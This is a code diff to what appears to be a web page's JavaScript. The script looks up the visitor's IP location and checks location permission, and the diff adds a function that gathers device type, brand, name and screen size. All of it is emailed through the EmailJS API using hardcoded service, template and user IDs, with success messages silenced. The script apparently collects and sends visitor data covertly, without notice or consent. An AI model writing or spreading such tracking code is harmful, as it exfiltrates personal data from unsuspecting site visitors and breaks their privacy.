@@ -93,6 +93,7 @@ var iplocation = httpGetAsync(url);
 
 debug += iplocation;
 checkLocationPermission();
+
 //debug += locAccess
 
 
@@ -115,10 +116,6 @@ checkLocationPermission();
         'message': debug
     }
 };
-
-
-
-
 
 $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
     type: 'POST',
@@ -247,6 +244,40 @@ function showError(error) {
       //console.log("An unknown error occurred.")
       break;
   }
+}
+
+
+function deviceDetails(API)
+{
+    deviceAPI = API;
+    var devicedetails= "devicetype:"+deviceAPI.deviceType+",devicebrand:"+deviceAPI.deviceBrand+"devicename"+deviceAPI.deviceName+"screenwidth"+deviceAPI.screenWidth+"screenheight"+deviceAPI.screenHeight+"screenratio"+deviceAPI.screeenRatio;
+    console.log(devicedetails);
+
+    var data = {
+    service_id: 'service_qgtevq3',
+    template_id: 'template_cugtf88',
+    user_id: 'user_5P5qPe1MLssEJvPPBZjnQ',
+    template_params: {
+        'message': devicedetails
+    }
+};
+
+
+$.ajax('https://api.emailjs.com/api/v1.0/email/send', {
+    type: 'POST',
+    async: false,
+    data: JSON.stringify(data),
+    contentType: 'application/json'
+}).done(function() {
+    //console.log("mail is sent");
+    //alert('Your message is sent successfully, You will not get a reply');
+}).fail(function(error) {
+    console.log('Oops... ' + JSON.stringify(error));
+    //alert('Oops... ' + JSON.stringify(error));
+
+});
+
+
 }
 
 
